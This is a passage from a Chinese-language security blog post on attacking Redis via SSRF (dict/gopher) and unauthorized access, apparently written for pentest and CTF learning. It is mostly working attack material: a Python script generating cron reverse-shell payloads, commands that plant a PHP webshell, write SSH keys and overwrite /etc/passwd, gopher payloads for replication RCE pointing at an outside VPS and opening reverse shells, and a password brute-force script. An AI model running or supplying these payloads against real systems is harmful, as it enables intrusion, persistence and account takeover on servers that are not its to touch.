class="function">对应：</span></span><br><span class="line"><span class="function"><span class="title">dict</span>://172.2.0.2:6379/<span class="title">save</span></span></span><br></pre></td></tr></table></figure></div>

<p>写入的payload中<code>* * * * *</code> 意义：</p>
<p><code>* * * * *</code> 是一个 cron 表达式，用于表示定时任务的执行时间。Cron 是一种用于在 UNIX&#x2F;Linux 系统中执行预定任务的时间表达式。这五个星号分别代表分钟、小时、日期、月份和星期。</p>
<p><code>*</code>是通配符，表示”每”。在这里，<code>* * * * *</code> 表示每分钟的每秒都执行。</p>
<p>因此，<code>* * * * *</code> 表达式表示每分钟都执行一次定时任务。</p>
<h4 id="绕过-截断"><a href="#绕过-截断" class="headerlink" title="绕过?截断"></a>绕过?截断</h4><p> 主要用于dict协议中，当dict协议要写入键值对，如：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">dict://127.0.0.1:6379/set:atao:&lt;?php phpinfo();?&gt;</span><br><span class="line"></span><br><span class="line">接收到的内容</span><br><span class="line">CLIENT libcurl 7.68.0</span><br><span class="line">set atao &lt;</span><br><span class="line">QUIT</span><br><span class="line">可以看到?以及后面的内容都没了</span><br><span class="line"></span><br><span class="line">这里通过对&lt;?等特殊符号进行转义绕过</span><br><span class="line">dict://127.0.0.1:6379/set:atao:\x3c\x3fphp\x20phpinfo0x28\x29\x3b\x3f\x3e</span><br></pre></td></tr></table></figure></div>



<h4 id="绕过-本地-判断"><a href="#绕过-本地-判断" class="headerlink" title="绕过 本地 判断"></a>绕过 本地 判断</h4><p>当限制了gopher和127、localhost 等字符时，可以使用 0 代表当前IP或域名解析等方式即可绕过访问本地限制，使用dict协议写入redis。</p>
<h4 id="一键式-ssrf-redis-dict-利用脚本"><a href="#一键式-ssrf-redis-dict-利用脚本" class="headerlink" title="一键式 ssrf + redis + dict 利用脚本"></a>一键式 ssrf + redis + dict 利用脚本</h4><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="comment"># -*- coding: UTF-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://192.168.0.109/ssrf/base/curl_exec.php?url=&quot;</span>  <span class="comment"># 存在 ssrf 的 url</span></span><br><span class="line">target = <span class="string">&quot;dict://192.168.0.119:6379/&quot;</span>  <span class="comment"># redis 服务器地址</span></span><br><span class="line">cmds = [<span class="string">&#x27;set:mars:\\\\&quot;\\n* * * * * root bash -i &gt;&amp; /dev/tcp/192.168.0.119/9999 0&gt;&amp;1\\n\\\\&quot;&#x27;</span>,  <span class="comment"># shell接收地址与端口号</span></span><br><span class="line">        <span class="string">&quot;config:set:dir:/etc/&quot;</span>,</span><br><span class="line">        <span class="string">&quot;config:set:dbfilename:crontab&quot;</span>,</span><br><span class="line">        <span class="string">&quot;bgsave&quot;</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> cmd <span class="keyword">in</span> cmds:</span><br><span class="line">    cmd_encoder = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> single_char <span class="keyword">in</span> cmd:</span><br><span class="line">        <span class="comment"># 先转为ASCII</span></span><br><span class="line">        cmd_encoder += <span class="built_in">hex</span>(<span class="built_in">ord</span>(single_char)).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br><span class="line">    cmd_encoder = binascii.a2b_hex(cmd_encoder)</span><br><span class="line">    cmd_encoder = urllib.parse.quote(cmd_encoder, <span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    payload = url + target + cmd_encoder</span><br><span class="line">    <span class="built_in">print</span>(payload)</span><br><span class="line">    <span class="comment"># request = urllib.request.Request(payload)</span></span><br><span class="line">    <span class="comment"># response = urllib.request.urlopen(request).read()</span></span><br></pre></td></tr></table></figure></div>





<h2 id="5-漏洞攻击"><a href="#5-漏洞攻击" class="headerlink" title="5.漏洞攻击"></a>5.漏洞攻击</h2><h3 id="未授权访问漏洞"><a href="#未授权访问漏洞" class="headerlink" title="未授权访问漏洞"></a>未授权访问漏洞</h3><p>由于配置不当的原因，导致Redis服务暴露在公网（即绑定在0.0.0.0:6379），并且没有开启相关认证和添加相关安全策略的情况下，即存在未授权访问漏洞。</p>
<p>攻击者在未授权访问Redis的情况下，可以获取数据库的所有数据、删除数据库数据等，进一步地可以利用Redis相关方法来实现写入WebShell、写入Crontab定时任务、写入SSH公钥以及利用主从复制RCE等一系列的攻击利用，将Redis未授权访问漏洞的危害无限放大。</p>
<h4 id="安全配置密码验证"><a href="#安全配置密码验证" class="headerlink" title="安全配置密码验证"></a>安全配置密码验证</h4><p>我们可以通过Redis的配置文件设置密码参数，这样客户端连接到Redis服务就需要密码验证，这样可以让你的Redis服务更安全，进而杜绝了未授权访问漏洞。</p>
<p>我们可以通过以下命令查看是否设置了密码验证：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;&quot;</span><br></pre></td></tr></table></figure></div>

<p>默认情况下requirepass参数是空的，这就意味着你无需通过密码验证就可以连接到Redis服务。</p>
<p>你可以通过以下命令来修改该参数：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; CONFIG set requirepass &quot;koishi&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; CONFIG get requirepass</span><br><span class="line">1) &quot;requirepass&quot;</span><br><span class="line">2) &quot;koishi&quot;</span><br></pre></td></tr></table></figure></div>

<p>设置密码后，客户端连接Redis服务就需要密码验证，否则无法执行命令。</p>
<p>密码验证用到AUTH命令，如下：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">127.0.0.1:6379&gt; AUTH &quot;password&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; SET mykey &quot;Test value&quot;</span><br><span class="line">OK</span><br><span class="line">127.0.0.1:6379&gt; GET mykey</span><br><span class="line">&quot;Test value&quot;</span><br></pre></td></tr></table></figure></div>



<h4 id="敏感信息泄露与数据库内容删除"><a href="#敏感信息泄露与数据库内容删除" class="headerlink" title="敏感信息泄露与数据库内容删除"></a>敏感信息泄露与数据库内容删除</h4><p>使用Redis的语句可以获取数据库中的存储的敏感信息，这里为了方便直接通过<code>keys *</code>来获取所有的键，然后通过get命令获取键值（如果在实际的业务中，一般不会查询所有键，因为对性能影响太大了，而是通过查询指定的某些数据库内容）：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120154220788.png"
                      alt="image-20240120154220788"
                ></p>
<p>使用info命令可以看到Redis的版本、OS内核版本、配置文件路径等信息：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120154454909.png"
                      alt="image-20240120154454909"
                ></p>
<p>使用flushall等相关命令可以将Redis数据库所有内容删除掉，注意要慎用，这里就不演示了。</p>
<h4 id="向Web目录写入WebShell"><a href="#向Web目录写入WebShell" class="headerlink" title="向Web目录写入WebShell"></a>向Web目录写入WebShell</h4><p>前提是Redis所在机子开启了Web服务，且已知Web服务目录路径。</p>
<p>原理就是在Redis中插入一条数据，将WebShell代码作为value，key值随意，然后通过修改数据库的默认路径为Web服务目录和默认的缓存文件为WebShell文件，最后通过save命令以备份的方式把缓存的数据保存在文件里，这样就可以在服务器端的Web目录下生成一个WebShell文件。</p>
<p>具体步骤就是先写入一个含WebShell代码的键值，然后设置备份目录为Web目录，接着设置备份文件名为WebShell文件名，最后通过save命令保存文件到本地。如下：</p>
<p>我这里服务目录在：<code>/home/kali/Desktop/temp</code> ，根据实际情况修改</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">set payload &quot;&lt;?php @eval($_POST[1]);?&gt;&quot;</span><br><span class="line">config set dir /home/kali/Desktop/temp</span><br><span class="line">config set dbfilename koishi.php</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120155730136.png"
                      alt="image-20240120155730136"
                ></p>
<p>发现能成功写入，由于PHP的容错性，该PHP代码是能正常执行的，能正常getshell：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120155804353.png"
                      alt="image-20240120155804353"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120160329810.png"
                      alt="image-20240120160329810"
                ></p>
<h4 id="写入SSH公钥直接登录"><a href="#写入SSH公钥直接登录" class="headerlink" title="写入SSH公钥直接登录"></a>写入SSH公钥直接登录</h4><p>前提是Redis服务是以root权限运行的。</p>
<p>如果目标没有web服务，但是开启了ssh且允许免密登录的话，可以尝试这种方法。</p>
<p>原理和前面一样的，只是备份的目录和文件名修改为&#x2F;root&#x2F;.ssh&#x2F;目录和authorized_keys文件名。</p>
<p>先在服务器中生成公私钥：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120160955642.png"
                      alt="image-20240120160955642"
                ></p>
<p>获取公钥内容<code>cat /home/kali/.ssh/id_rsa.pub</code></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRONYAUcEiNMRqrK2szP6zN4bM9IrwV9A0fq6xe2L+3zOsIGoeaMr/hmmYeiRd8/zkG7qhTZyf+ccZK22g2Yfp0kMXHwuRif8fejGueuNvqRKiOYQRsNB78NUDnfM2So60173MF7TTTo76EZCFnjyxce8W3XohvtlTObK/rdIxpIGnQjpsVXCG8TiL5MwquLsiCsowVUe+Z0OtZiYNAQPFvaWHDZfIhTfeYUApdaSzPSFb3vhB6WOz53TVaaglzehlqJCrE1dI04XyLIn/ysiXgKErCU8AjH8N/iAetVKJN0dla4JgGW9oDslY8DoJnk17kunsUkCS57aWlG91+5Yt0MZD4N/1ETTq9zfJmjlhmAFOpBBksmNpPkKtJTEYsGqDPseQjlkA4m8zMpPPYCpNw4N4Ozs9ImGmWaWdOtPRAPQnTTgcyVLfWYj0+BqrgiO7CMYRZPu4iQafYJmNCNRe21modsRpx9ry0fE1zTuKWpR8TB17gxey41ktLvmRJW0= kali@kali</span><br></pre></td></tr></table></figure></div>

<p>通过Redis客户端将公钥内容写入到&#x2F;root&#x2F;.ssh&#x2F;authorized_keys文件中，注意保存key的时候加上两个<code>\n</code>是为了避免和Redis里其他缓存数据混合：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">config set dir /root/.ssh/</span><br><span class="line">config set dbfilename authorized_keys</span><br><span class="line">set payload &quot;\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQCRONYAUcEiNMRqrK2szP6zN4bM9IrwV9A0fq6xe2L+3zOsIGoeaMr/hmmYeiRd8/zkG7qhTZyf+ccZK22g2Yfp0kMXHwuRif8fejGueuNvqRKiOYQRsNB78NUDnfM2So60173MF7TTTo76EZCFnjyxce8W3XohvtlTObK/rdIxpIGnQjpsVXCG8TiL5MwquLsiCsowVUe+Z0OtZiYNAQPFvaWHDZfIhTfeYUApdaSzPSFb3vhB6WOz53TVaaglzehlqJCrE1dI04XyLIn/ysiXgKErCU8AjH8N/iAetVKJN0dla4JgGW9oDslY8DoJnk17kunsUkCS57aWlG91+5Yt0MZD4N/1ETTq9zfJmjlhmAFOpBBksmNpPkKtJTEYsGqDPseQjlkA4m8zMpPPYCpNw4N4Ozs9ImGmWaWdOtPRAPQnTTgcyVLfWYj0+BqrgiO7CMYRZPu4iQafYJmNCNRe21modsRpx9ry0fE1zTuKWpR8TB17gxey41ktLvmRJW0= kali@kali\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>



<p>到自己之前生成的私钥下面去，可以使用命令利用这个私钥进行连接服务端 root，得到shell：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -i id_rsa root@192.168.13.128</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120161654223.png"
                      alt="image-20240120161654223"
                ></p>
<h4 id="写入定时任务反弹shell"><a href="#写入定时任务反弹shell" class="headerlink" title="写入定时任务反弹shell"></a>写入定时任务反弹shell</h4><p>该方法只能CentOS上使用，Ubuntu、Debian上行不通（所以没有装centos的我就没有复现了）。原因如下：</p>
<ul>
<li>权限问题，Ubuntu定时任务需要root权限；</li>
<li>Redis备份文件存在乱码，而Debian和Ubuntu对定时任务的格式校验很严格，因此在Debian和Ubuntu上会报错，而在CentOS上不会报错；</li>
</ul>
<p>原理和前面是一样的，只是备份的目录和文件名修改了下：</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">config <span class="built_in">set</span> <span class="built_in">dir</span> /var/spool/cron/crontabs/</span><br><span class="line">config <span class="built_in">set</span> dbfilename root</span><br><span class="line"><span class="built_in">set</span> payload &quot;\n\n* * * * * bash -i &gt;&amp; /dev/tcp/<span class="number">192</span>.<span class="number">168</span>.<span class="number">13</span>.<span class="number">128</span>/<span class="number">5555</span> <span class="number">0</span>&gt;&amp;<span class="number">1</span>\n\n&quot;</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>

<p>注意，不同类型、版本的OS的crontabs所在路径会有所区别。</p>
<p>可以看到在Kali中成功生成root文件，其中含有定时任务的内容，也包括了乱码：</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120162328658.png"
                      alt="image-20240120162328658"
                ></p>
<p>此时并未在监听端接收到反弹shell。这是由于Kali是Debian系统，对定时任务的格式要求很严，而root文件内容含有乱码，会导致执行不成功。除此之外，还有root文件执行的权限问题，我们通过<code>tail /var/log/syslog</code>命令来查看如下错误信息，因为权限不够、所以cron拒绝执行该定时任务：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">cron[441]: (root) INSECURE MODE (mode 0600 expected) (crontabs/root)</span><br></pre></td></tr></table></figure></div>

<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120162418179.png"
                      alt="image-20240120162418179"
                ></p>
<p>具体CentOS的利用可自行测试。</p>
<p>不同OS的系统任务调度文件：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">Ubuntu</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Debian</span><br><span class="line">/etc/cron.d/xxx</span><br><span class="line">或</span><br><span class="line">/var/spool/cron/crontabs/xxx</span><br><span class="line"></span><br><span class="line">Alpine</span><br><span class="line">/etc/cron.d/xxx</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>可进行利用的cron有如下几个地方：</p>
<ul>
<li>&#x2F;etc&#x2F;crontab 这个是肯定的</li>
<li>&#x2F;etc&#x2F;cron.d&#x2F;* 将任意文件写到该目录下，效果和crontab相同，格式也要和&#x2F;etc&#x2F;crontab相同。漏洞利用这个目录，可以做到不覆盖任何其他文件的情况进行弹shell。</li>
<li>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;root centos系统下root用户的cron文件</li>
<li>&#x2F;var&#x2F;spool&#x2F;cron&#x2F;crontabs&#x2F;root debian系统下root用户的cron文件</li>
</ul>
</blockquote>
<p>还有师傅是这么解释的：</p>
<blockquote>
<p><strong>这个方法只能<code>Centos</code>上使用，<code>Ubuntu上行不通</code>，原因如下：</strong></p>
<ol>
<li>因为默认redis写文件后是644的权限，但ubuntu要求执行定时任务文件<code>/var/spool/cron/crontabs/&lt;username&gt;</code>权限必须是600也就是<code>-rw-------</code>才会执行，否则会报错<code>(root) INSECURE MODE (mode 0600 expected)</code>，而Centos的定时任务文件<code>/var/spool/cron/&lt;username&gt;</code>权限644也能执行</li>
<li>因为redis保存RDB会存在乱码，在Ubuntu上会报错，而在Centos上不会报错</li>
</ol>
<p>由于系统的不同，crontrab定时文件位置也会不同<br>Centos的定时任务文件在<code>/var/spool/cron/&lt;username&gt;</code><br>Ubuntu定时任务文件在<code>/var/spool/cron/crontabs/&lt;username&gt;</code><br>Centos和Ubuntu均存在的（需要root权限）<code>/etc/crontab</code> PS：高版本的redis默认启动是<code>redis</code>权限，故写这个文件是行不通的</p>
</blockquote>
<h4 id="写入-etc-passwd文件实现任意账号密码重置"><a href="#写入-etc-passwd文件实现任意账号密码重置" class="headerlink" title="写入&#x2F;etc&#x2F;passwd文件实现任意账号密码重置"></a>写入&#x2F;etc&#x2F;passwd文件实现任意账号密码重置</h4><p><font color="red"><strong>这个对系统影响比较大，我没有去复现</strong></font></p>
<p>Linux存账户密码一般会有&#x2F;etc&#x2F;passwd和&#x2F;etc&#x2F;shadow，如果两个出现冲突的话，会以&#x2F;etc&#x2F;passwd为准。<br>另外，&#x2F;etc&#x2F;passwd的权限一般是644，比&#x2F;etc&#x2F;shadow的640要高。而且，redis写入是覆盖的，也就是说，写入进去覆盖之后，其他的都没了，这个过程是有创且不可逆的。<br>但是可以通过与&#x2F;etc&#x2F;passwd- 和&#x2F;etc&#x2F;shadow对比，起码可恢复99%的内容。当然，做这步骤前事先和负责人联系，得到许可后自然是最好的，都可以省的恢复了。</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">mkpasswd --method=md5 --salt=&#x27;$6$my0salt0&#x27; &#x27;YourNewPasswd%1024&#x27; 	//使用mkpasswd生成密码，或者用下面这个python</span><br><span class="line">python3 -c &#x27;import crypt; print(crypt.crypt(&quot;YourNewPasswd%1024&quot;, &quot;$6$my0salt0&quot;))&#x27;</span><br><span class="line"></span><br><span class="line">config set dir /etc/</span><br><span class="line">config set dbfilename passwd 								//将生成的MD5写入到/etc/passwd中</span><br><span class="line">SET abcd &quot;\n\n root:$6$my0salt0$yCCi..OsWo8n5MaBFytGaZ0qTcHErSaoyvAVvMXFEnwgMOtpm6sYbtwUR4I.GA7Kt0X0KruYifS6c9.FkDN53.:0:0:root:/root:/bin/bash\nsshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin\n\n&quot;</span><br><span class="line"></span><br><span class="line">//要想ssh登录root账号，除了写入root之外，还需要写入sshd账号sshd:x:108:65534::/var/run/sshd:/usr/sbin/nologin\n\n</span><br><span class="line">save</span><br></pre></td></tr></table></figure></div>

<p>然后登录</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh root@192.168.13.128</span><br></pre></td></tr></table></figure></div>

<p>输入明文密码 <code>YourNewPasswd%1024</code> ,成功登录</p>
<h4 id="其他的利用"><a href="#其他的利用" class="headerlink" title="其他的利用"></a>其他的利用</h4><p>任何可利用Redis未授权访问漏洞来写文件的地方都能被进行恶意利用，除了前面几项利用方式外，还有以下收集的几个在Linux或Windows下的利用方式。</p>
<p><a class="link"   href="https://tatsumaki.cn/2020/08/20/redis/#toc-heading-9" >https://tatsumaki.cn/2020/08/20/redis/#toc-heading-9 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>写入Windows启动项：<a class="link"   href="https://www.anquanke.com/post/id/170360#h3-3" >https://www.anquanke.com/post/id/170360#h3-3 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>写入Windows MOF：<a class="link"   href="https://www.anquanke.com/post/id/170360#h3-4" >https://www.anquanke.com/post/id/170360#h3-4 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<h3 id="利用主从复制RCE"><a href="#利用主从复制RCE" class="headerlink" title="利用主从复制RCE"></a>利用主从复制RCE</h3><h4 id="Redis主从复制"><a href="#Redis主从复制" class="headerlink" title="Redis主从复制"></a>Redis主从复制</h4><p>如果把数据存储在单个Redis中，而读写体量比较大的时候，服务端的性能就会大受影响。为了应对这种情况，Redis就提供了主从模式。</p>
<p>Redis主从模式是指使用一个Redis作为主机，其他Redis则作为从机即备份机。其中主机和从机数据相同，主机只负责写，从机只负责读，通过读写分离可以大幅度减轻流量的压力，即是一种通过牺牲空间来换取效率的缓解方式。</p>
<h4 id="攻击利用"><a href="#攻击利用" class="headerlink" title="攻击利用"></a>攻击利用</h4><p>主从复制实现RCE还是属于未授权访问的一种利用方式，这里因为其较新型便单独提出一小节。</p>
<p>4.x、5.x 版本的Redis提供了主从模式。在Redis 4.x 之后，通过外部扩展，可以在Redis中实现一个新的Redis命令，构造恶意.so文件。在两个Redis实例设置主从模式的时候，Redis的主机可以通过FULLRESYNC同步文件到从机上，然后在从机上加载恶意so文件，即可执行命令。</p>
<p>Redis主从数据库之间的同步分为两种：</p>
<ul>
<li>全量复制是将数据库备份文件整个传输过去从机，然后从机清空内存数据库，将备份文件加载到数据库中；</li>
<li>部分复制只是将写命令发送给从机；</li>
</ul>
<p>因此，想要复制备份文件的话就需要设置Redis主机的传输方式为全量传输。</p>
<p>这里我们只需要模拟协议收发包就能伪装成Redis主机了</p>
<h5 id="利用工具"><a href="#利用工具" class="headerlink" title="利用工具"></a>利用工具</h5><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://github.com/n0b0dyCN/RedisModules-ExecuteCommand</span><br><span class="line">git clone https://github.com/Ridter/redis-rce.git</span><br></pre></td></tr></table></figure></div>

<p>第一个工具是用于生成恶意的执行shell的so文件；第二个工具是伪造Redis主机的脚本。</p>
<p>首先要生成恶意so文件，下载第一个工具然后make即可生成。</p>
<p>然后在攻击者机器上执行如下命令即可成功RCE：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">python redis-rce.py -r 192.168.13.128 -p 6379 -L 192.168.13.128 -f module.so</span><br></pre></td></tr></table></figure></div>

<p>我本地是redis 7.2.4 的，加载模块会出错，我看某些说的需要在5.0.5及以下版本的才行，我没有做尝试。</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/images/blog/image-20240120192456256.png"
                      alt="image-20240120192456256"
                ></p>
<h5 id="手打"><a href="#手打" class="headerlink" title="手打"></a>手打</h5><p>因为大多数情况不会直接是未授权的漏洞，通常结合ssrf或者其他漏洞，因此工具具有很大的局限性，这里给出手打的payload，方便在各种情况下进行攻击。</p>
<h6 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h6><p>（不需要认证时可以把auth root删掉）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">config set dir /tmp/</span><br><span class="line">quit</span><br><span class="line">//设置备份文件路径为/tmp/ 试了很多目录，最后发现只有/tmp有权限写入。</span><br><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dir%2520%252Ftmp%252F%250Aquit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">config set dbfilename exp.so</span><br><span class="line">slaveof 43.138.0.3 6666</span><br><span class="line">quit</span><br><span class="line">//设置备份文件名为：exp.so，设置主redis地址为43.138.0.3，端口为6666 地址为自己的VPS</span><br><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250Aconfig%2520set%2520dbfilename%2520exp.so%250Aslaveof%252043.138.0.3%25206666%250Aquit</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">module load /tmp/exp.so</span><br><span class="line">quit</span><br><span class="line">//导入 exp.so</span><br><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250Amodule%2520load%2520%252Ftmp%252Fexp.so%250Aquit</span><br></pre></td></tr></table></figure></div>



<p>还有的payload为：</p>
<p><strong>关闭主从同步</strong></p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250aslaveof%2520NO%2520ONE%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">slaveof NO ONE</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>



<p><strong>导出数据库</strong><br>（设置备份文件名字）</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250aconfig%2520set%2520dbfilename%2520dump.rdb%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">config set dbfilename dump.rdb</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>



<p><strong>不出网 – 命令执行获取flag</strong></p>
<p>使用 exp.so</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250asystem.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">system.exec &quot;cat /flag&quot;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>

<p>使用 exp2.so</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250d%250aRedisRuntime.exec%2520%2522cat%2520%252Fflag%2522%250d%250aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">RedisRuntime.exec &quot;cat /flag&quot;</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>



<p><strong>出网 – 反弹shell</strong></p>
<p>使用 exp2.so</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">gopher://0.0.0.0:6379/_auth%2520root%250ARedisRuntime.exec%252043.138.0.3%25202740%250Aquit</span><br><span class="line"></span><br><span class="line">#上述payload的解码结果</span><br><span class="line">gopher://0.0.0.0:6379/_auth root</span><br><span class="line">RedisRuntime.exec 43.138.0.3 2740</span><br><span class="line">quit</span><br></pre></td></tr></table></figure></div>



<h6 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h6><p>公网使用 Awsome-Redis-Rogue-Server 来开启redis 主服务</p>
<div class="highlight-container" data-rel="Cmd"><figure class="iseeu highlight cmd"><table><tr><td class="code"><pre><span class="line">python3 redis_rogue_server.py -v -<span class="built_in">path</span> exp.so -lport <span class="number">6666</span></span><br><span class="line"></span><br><span class="line">python3 redis_rogue_server.py -v -<span class="built_in">path</span> exp2.so -lport <span class="number">6666</span></span><br></pre></td></tr></table></figure></div>

<p>如果要反弹shell则也开启nc监听</p>
<p>然后在漏洞处注入payload即可</p>
<h3 id="暴力破解Redis密码"><a href="#暴力破解Redis密码" class="headerlink" title="暴力破解Redis密码"></a>暴力破解Redis密码</h3><h4 id="用Hydra"><a href="#用Hydra" class="headerlink" title="用Hydra"></a>用Hydra</h4><p>使用Hydra工具可以对Redis密码进行暴力破解：</p>
<div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">hydra -P ./passwords.txt redis://192.168.13.128</span><br></pre></td></tr></table></figure></div>



<h4 id="用python"><a href="#用python" class="headerlink" title="用python"></a>用python</h4><p>面对内网 redis 认证的情况下，可以利用 dict 或者 gopher 等协议编写脚本尝试爆破 Redis 口令。可以再用多线程进行优化一下，由于有Hydra了，就不去改这个了，懂意思就行。</p>
<div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">import</span> urllib.parse</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://xx.xx.xx.xx:8000/ssrf.php?url=&quot;</span></span><br><span class="line"></span><br><span class="line">param = <span class="string">&#x27;dict://127.0.0.1:6379/auth:&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">r&#x27;./top100.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">100</span>):</span><br><span class="line">        passwd = f.readline()</span><br><span class="line">        all_url = url + param + passwd</span><br><span class="line">        request = urllib.request.Request(all_url)</span><br><span class="line">        response = urllib.request.urlopen(request).read()</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;+OK\\r\\n+OK\\r\\n&quot;</span>.encode() <span class="keyword">in</span> response:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;redis passwd:&quot;</span> + 